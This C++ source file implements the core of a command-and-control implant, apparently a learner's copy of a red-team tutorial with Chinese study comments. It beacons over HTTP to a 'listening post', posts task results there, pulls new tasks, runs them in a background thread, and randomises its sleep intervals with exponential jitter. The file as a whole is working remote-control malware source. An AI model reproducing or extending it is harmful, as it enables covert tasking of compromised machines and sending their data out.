#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "implant.h"
#include "tasks.h"

#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <algorithm>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>

#include <nlohmann/json.hpp>

#include <cpr/cpr.h>

using json = nlohmann::json;

// Function to send an asynchronous HTTP POST request with a payload to the listening post
[[nodiscord]] std::string sendHttpRequest(std::string_view host,
    std::string_view port,
    std::string_view uri,
    std::string_view payload) {
        // Set all our request constants
        auto const serverAddress = host;
        auto const serverPort = port;
        auto const serverUri = uri;
        //1.1
        auto const httpVersion = 11;
        auto const requestBody = json::parse(payload);

        // Construct our listening post endpoint URL from user args, only HTTP to start
        std::stringstream ss;
        ss << "http://" <<serverAddress << ":" << serverPort << serverUri;
        std::string fullServerUrl = ss.str();
       
        // Make an asynchronous HTTP POST request to the listening post
        cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
            cpr::Body{ requestBody.dump() },
            cpr::Header{ {"Content-Type","application/json"} });
        // Retrieve the response when it's ready
        cpr::Response response = asyncRequest.get();

        // Show the request contents
        std::cout << "Request body:" << requestBody <<std::endl;

        // Return the body of the response from the listening post, may include new tasks
        return response.text;
    };

// Method to enable/disable the running status on our implant
void Implant::setRunning(bool isRunningIn){isRunning = isRunningIn;}

// Method to set the mean dwell time on our implant
void Implant::setMeanDwell(double meanDwell){
    dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
}

// Method to send task results and receive new tasks
[[nodiscard]] std::string Implant::sendResults(){
    // Local results variable
    boost::property_tree::ptree resultsLocal;
    //作用域锁
    //scoped_lock将多个锁（std::mutex等）包装成一种锁类型，用于线程一次性申请多个锁，避免死锁
    //use a scoped lock to swap the values of the results into the local variable "resultsLocal"
    {
        std::scoped_lock<std::mutex> resultsLock{resultsMutex};
        resultsLocal.swap(results);
    }
    // Format result contents
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream,resultsLocal);
    // Contact listening post with results and return any tasks received
    return sendHttpRequest(host,port,uri,resultsStringStream.str());
}

// Method to parse tasks received from listening post
void Implant::parseTasks(const std::string& response){
    // Local response variable
    // hold the response with the tasks we got from the listening post
    std::stringstream responseStringStream{response};

    // Read response from listening post as JSON
    boost::property_tree::ptree tasksPropTree;
    boost::property_tree::read_json(responseStringStream,tasksPropTree);

    // Range based for-loop to parse tasks and push them into the tasks vector  
    // Once this is done, the tasks are ready to be serviced by the implant
    for(const auto& [taskTreeKey,taskTreeValue] : tasksPropTree){
        // A scoped lock to push tasks into vector, push the task tree and setter for the configuration task
        {
            //task in .h file
            //把每个键值对放到tasks这个vector里
            tasks.push_back(
                parseTaskFrom(taskTreeValue,[this](const auto& configuration){
                    // it's implant configuration
                    setMeanDwell(configuration.meanDwell);
                    setRunning(configuration.isRunning);
                })
            );
        }
    }
}

// Loop and go through the tasks received from the listening post, then service them
// go through all the tasks and run the code to execute them in a dedicated thread
void Implant::serviceTasks(){
    //this flag sets in our implant configuration object
    while(isRunning) {
        // Local tasks variable
        std::vector<Task> localTasks;
        // Scoped lock to perform a swap
        {
            std::scoped_lock<std::mutex> taskLock{taskMutex};
            //为啥下面用的是localTasks而不是tasks？到底swap了个啥？
            //应该是看要的东西是啥，所以为啥要swap
            tasks.swap(localTasks);
        }

        // Range based for-loop to call the run() method on each task and add the results of tasks
        for(const auto& task : localTasks){

            // Call run() on each task and we'll get back values for id, contents and success
            // We place the returned "id", "contents" and "success" values into respective variables
            // visit() allows you to call a function over a currently active type in std::variant
            // Invoke _Obj with the contained values of _Args... (调用对应task类型的run方法，比如ping或者其他的？)
            const auto [id,contents,success] = std::visit([](const auto& task){return task.run();}, task);
            // Scoped lock to add task results
            {
                std::scoped_lock<std::mutex> resultsLock{resultsMutex};
                results.add(boost::uuids::to_string(id) + ".contents",contents);
                results.add(boost::uuids::to_string(id) + ".success",success);
            }
        }
        // Go to sleep
        std::this_thread::sleep_for(std::chrono::seconds{1});
    }
}

// Method to start beaconing to the listening post
void Implant::beacon(){
    while(isRunning){
        // Try to contact the listening post and send results/get back tasks
        // Then, if tasks were received, parse and store them for execution
        // Tasks stored will be serviced by the task thread asynchronously
        try{
            // The loop is going to try and contact the listening post 
            // by sending any task results (or a blank JSON payload if there are no results)
            std::cout << "Implant is sending results to listening post...\n" << std::endl;
            const auto serverResponse = sendResults();
            std::cout << "\nListening post response content:" <<serverResponse << std::endl;
            std::cout << "\nParsing tasks received..." << std::endl;
            //Then, it's going to parse the tasks received from the 
            //listening post inside the "serverResponse" variable.
            parseTasks(serverResponse);
            std::cout << "\n=============================================\n" <<std::endl;
        }
        catch (const std::exception& e){
            printf("\nBeaconing error: %s\n", e.what());
        }
        // Sleep for a set duration with jitter and beacon again later
        const auto sleepTimeDouble = dwellDistributionSeconds(device);
        const auto sleepTimeChrono = std::chrono::seconds{static_cast<unsigned long long>(sleepTimeDouble)};
        std::this_thread::sleep_for(sleepTimeChrono * 10);
    }
}

// Initialize variables for our object
Implant::Implant(std::string host,std::string port,std::string uri) :
    // Listening post endpoint URL arguments
    host{ std::move(host) },
    port{ std::move(port) },
    uri{std::move(uri)},

    // Options for configuration settings
    isRunning{true},
    dwellDistributionSeconds{ 1. },

    // Thread that runs all our tasks, performs asynchronous I/O
    // it will run the "serviceTasks" function and actually run all of our task code.
    taskThread{ std::async(std::launch::async,[this] {serviceTasks();})}{}
